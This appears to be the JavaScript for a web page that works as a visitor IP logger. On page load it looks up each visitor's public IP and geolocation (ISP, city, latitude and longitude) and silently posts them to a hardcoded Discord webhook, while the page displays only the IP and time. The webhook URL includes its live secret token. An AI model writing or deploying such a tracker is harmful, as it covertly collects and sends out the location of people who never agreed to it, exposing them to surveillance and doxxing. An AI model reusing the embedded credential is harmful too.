document.addEventListener('DOMContentLoaded', () => {
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ipAddress = data.ip;
      const currentDateTime = new Date();
      const dateTimeString = currentDateTime.toLocaleString();

      fetch(`https://ip-api.com/json/${ipAddress}`)
        .then(response => response.json())
        .then(geoData => {
          const message = createMessage(ipAddress, dateTimeString, geoData);
          sendToDiscord(message);
        })
        .catch(error => console.error(error));

      document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
      document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
    })
    .catch(error => console.error(error));
});


function createMessage(ipAddress, dateTimeString, geoData) {
  const { query, isp, country, regionName, city, zip, lat, lon } = geoData;

  const message = {
    embeds: [
      {
        title: '***NEW VISITOR***',
        color: 16776960, // Yellow color
        description: `
          IP Address: ${query}
          Date and Time: ${dateTimeString}
          ISP: ${isp}
          Country: ${country}
          Region: ${regionName}
          City: ${city}
          Latitude: ${lat}
          Longitude: ${lon}
        `,
        thumbnail: {
          url: 'https://cdn.discordapp.com/attachments/1008763573029306519/1112393554585718867/1075892497257091092.png' // Customize the URL of the preview image
        },
        url: 'https://applebeesworker.github.io' // Customize the URL of the website
      }
    ]
  };

  return message;
}

function sendToDiscord(message) {
  const webhookUrl = 'https://discord.com/api/webhooks/1112106803765981329/F2ZlS_49qu_IA0wfgg79m7oYPLFMAzGRrwh_njh50636BPjnmPs8P_F5Zdgss63Mna8D';

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(message)
  })
    .then(response => {
      if (!response.ok) {
        throw new Error('Error sending message to Discord');
      }
    })
    .catch(error => console.error(error));
}
